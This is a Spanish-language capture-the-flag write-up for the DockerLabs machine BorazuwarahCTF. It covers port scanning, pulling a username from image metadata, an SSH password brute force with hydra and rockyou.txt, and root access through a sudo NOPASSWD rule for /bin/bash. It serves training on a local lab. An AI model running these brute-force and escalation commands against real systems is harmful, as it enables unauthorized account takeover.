---
title: CTF-DockerLabs-BorazuwarahCTF
published: true
---

## WriteUps maquina BorazuwarahCTF de DockerLabs

---
tags:
  - CTF
  - estado/completado
  - plataforma: [DockerLabs]
  - dificultad: Muy fácil
  - autor: [EBorazuwarah]

# Datos

[!INFO] BorazuwarahCTF
  -  **Nombre:** BorazuwarahCTF
  -  **SO:** Linux
  -  **Dificultad:** Muy fácil
  -  **Enlace:** [Dockerlabs](https://dockerlabs.es/)

[!TODO] Objetivo
  - 🚩Ingresar a la maquina como algún usuario.
  - 🚩Elevar privilegios una vez obtenido el acceso.

El primer paso consiste en iniciar la máquina, lo cual es tan sencillo como ejecutar el siguiente comando después de haber descargado la maquina:

```bash
└─$ sudo bash auto_deploy.sh borazuwarahctf.tar
```

# Reconocimiento

  - Una vez iniciada la maquina, el mismo script de inicio me da la dirección IP a lo cual procedo a realizar un escaneo de puertos de la maquina y el resultado es el siguiente:

```bash
└─# nmap 172.17.0.2    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 12:42 -05
Nmap scan report for 172.17.0.2
Host is up (0.000036s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
```

Con ello ahora se que existe el puerto 80 abierto y el puerto 22 con el servicio ssh.

# Chequeando puerto 80

  - Lo primero que hago es visitar la pagina web que aparece en el puerto 80 con el servicio web y resulta que solo tengo una imagen de huevo sorpresa que dice: Te quiero con el siguiente código:

```
<html  -
<body  -
<img src='[imagen.jpeg](http://172.17.0.2/imagen.jpeg)'  -
</body  -
</html  -
```

![TQhuevoSorpresa.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/TQhuevoSorpresa.png)

Código bastante sencillo y pues me parece extraño la importancia a la imagen, así que analizo la imagen su metadatos, de la siguiente forma: `exiftool descarga.jpeg` y con eso obtengo un usuario:

```
└─# exiftool descarga.jpeg 
ExifTool Version Number         : 12.76
File Name                       : descarga.jpeg
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2024:05:28 12:37:09-05:00
File Access Date/Time           : 2024:05:28 12:37:09-05:00
File Inode Change Date/Time     : 2024:05:28 12:37:09-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 12.76
Description                     : ---------- User: xxxxxxxx ----------
Title                           : ---------- Password:  ----------
Image Width                     : 455
Image Height                    : 455
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x455
Megapixels                      : 0.207
```

# Fuerza bruta SSH

  - Ahora que ya tengo un usuario, procedo a realizar un ataque de fuerza bruta usando `hydra` como en las otras maquinas, de la siguiente manera:

```bash
hydra -l xxxxxxxx -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: xxxxxxxx   password: xxxxxxxx
```

Y rápidamente me encuentra la contraseña del usuario, a lo que me conecto por SSH.

# Elevando privilegios

Estando dentro de la maquina, realizo un típico `sudo -l` y el resultado es:

```
sudo -l
Matching Defaults entries for borazuwarah on 61599ead1e0b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User borazuwarah may run the following commands on 61599ead1e0b:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```

A lo que sin dudarlo realizo un: `sudo /bin/bash` y listo, de esa manera soy root.

# Comandos

[!IMPORTANT] Resumen de comandos utilizados
  - `sudo bash auto_deploy.sh borazuwarahctf.tar`
  - `nmap 172.17.0.2`
  - `exiftool descarga.jpeg `
  - `hydra -l xxxxxxxx -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh`
  - `sudo -l`


```
¡Que la fuerza del hacking ético nos acompañe! :)
```

|   |
|:--|
|   |